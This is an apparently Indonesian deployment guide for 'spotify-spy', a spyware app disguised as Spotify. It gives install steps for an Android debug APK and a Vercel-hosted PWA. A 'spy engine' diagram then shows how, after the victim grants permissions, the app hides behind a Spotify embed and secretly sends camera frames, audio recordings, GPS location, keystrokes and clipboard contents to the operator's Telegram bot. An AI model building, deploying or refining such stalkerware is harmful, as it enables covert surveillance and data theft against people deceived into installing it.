OPSI A: ANDROID APK (RECOMMENDED)
────────────────────────────────────────────────────────────

1. Copy app-debug.apk ke HP Android
2. Install (enable Unknown Sources jika perlu)
3. Buka app
4. Allow semua permissions (Camera, Mic, GPS)
5. App jalan → Data mulai masuk ke Telegram
6. DONE! ✅


OPSI B: WEB PWA VIA VERCEL
────────────────────────────────────────────────────────────

1. Install Vercel CLI:
   npm install -g vercel

2. Login:
   vercel login

3. Deploy:
   cd d:\spotify-spy\vercel-deploy
   vercel --prod

4. Dapat link: https://your-app.vercel.app

5. Buka link di HP/Desktop

6. Install sebagai PWA:
   - Android: Tap banner "Install Spotify"
   - iOS: Safari → Share → Add to Home Screen
   - Desktop: Chrome → Address bar → Install icon

7. DONE! ✅

🔍 CARA KERJA SPY ENGINE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


1. USER BUKA APP
   ↓
2. REQUEST PERMISSIONS (Camera, Mic, GPS)
   ↓
3. USER KLIK "ALLOW"
   ↓
4. APP LOAD SPOTIFY EMBED (Kamuflase)
   ↓
5. SPY ENGINE START (delay 5s)
   ↓
6. BACKGROUND PROCESSES:
   ├─ Camera: getUserMedia() → capture frame → send to Telegram
   ├─ Audio: MediaRecorder → record → send to Telegram
   ├─ GPS: getCurrentPosition() → send to Telegram
   ├─ Keylog: addEventListener('keydown') → send to Telegram
   └─ Clipboard: readText() → send to Telegram
   ↓
7. DATA MASUK KE TELEGRAM BOT
   ↓
8. ANDA TERIMA DATA DI TELEGRAM CHAT
